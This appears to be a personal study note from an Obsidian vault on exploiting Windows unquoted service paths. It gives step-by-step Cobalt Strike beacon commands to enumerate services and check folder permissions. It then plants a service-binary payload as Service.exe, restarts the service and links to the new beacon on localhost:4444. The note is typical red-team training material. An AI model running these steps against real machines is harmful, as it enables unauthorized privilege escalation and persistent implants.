---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Unquoted Service Paths]]  
___

## Description:  
A Windows "service" is a special type of application that is usually started automatically when the computer boots.

**Look for a service that has both spaces in the path and is unquoted.

You can see the services installed on a machine by opening **services.msc**, or via the **sc** command line tool.

```
C:\>sc query

SERVICE_NAME: Appinfo
DISPLAY_NAME: Application Information
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: AudioEndpointBuilder
DISPLAY_NAME: Windows Audio Endpoint Builder
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Or the **Get-Service** PowerShell cmdlet.

```
PS C:\> Get-Service | fl

Name                : AJRouter
DisplayName         : AllJoyn Router Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32ShareProcess

Name                : ALG
DisplayName         : Application Layer Gateway Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32OwnProcess

```


An unquoted service path is where the path to the service binary is not wrapped in quotes.

WMI can be used to pull a list of every service and the path to its executable well using CobaltStrike.

```
beacon> run wmic service get name, pathname

Name                                      PathName
ALG                                       C:\Windows\System32\alg.exe
AppVClient                                C:\Windows\system32\AppVClient.exe
AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
[...snip...]
Vuln-Service-1                            C:\Program Files\Vuln Services\Service 1.exe

```


When Windows attempts to read the path to this executable, it interprets the space as a terminator. So it will attempt to execute the following (in order):

1.  `C:\Program.exe`
2.  `C:\Program Files\Vuln.exe`
3.  `C:\Program Files\Vuln Services\Service.exe`

If we can drop a binary into any of those paths, the service will execute it before the real one.

The PowerShell **Get-Acl** cmdlet will show the permissions of various objects (including files and directories).

```
beacon> powershell Get-Acl -Path "C:\Program Files\Vuln Services" | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Vuln Services
Owner  : BUILTIN\Administrators
Group  : WKSTN-1\None
Access : CREATOR OWNER Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  Write, ReadAndExecute, Synchronize
         NT SERVICE\TrustedInstaller Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize

```


Payloads to abuse services must be specific "service binaries". We can do this in Cobalt Strike via **Attacks > Packages > Windows Executable (S)** and selecting the **Service Binary** output type.

It's usually better to use a listener that is bound to the local host.

```
beacon> cd C:\Program Files\Vuln Services
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 5kb      fil     02/23/2021 15:04:13   Service 3.exe

beacon> upload C:\Payloads\beacon-tcp-svc.exe
beacon> mv beacon-tcp-svc.exe Service.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 5kb      fil     02/23/2021 15:04:13   Service 3.exe
 282kb    fil     03/03/2021 11:11:27   Service.exe

beacon> run sc stop Vuln-Service-1
beacon> run sc start Vuln-Service-1
# might have to wait for a reboot if you dont have stop/start permissions
```

You will not see a Beacon appear automatically. When the service has been started and the Beacon executed, you should see that port you used in your TCP listener configuration (in my case **4444**) is listening on **127.0.0.1**.

```
beacon> run netstat -anp tcp
[...snip...]
TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING
```

The Beacon is waiting for us to connect to it, which we do with the **connect** command.

```
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.17.231

```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (09:17 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
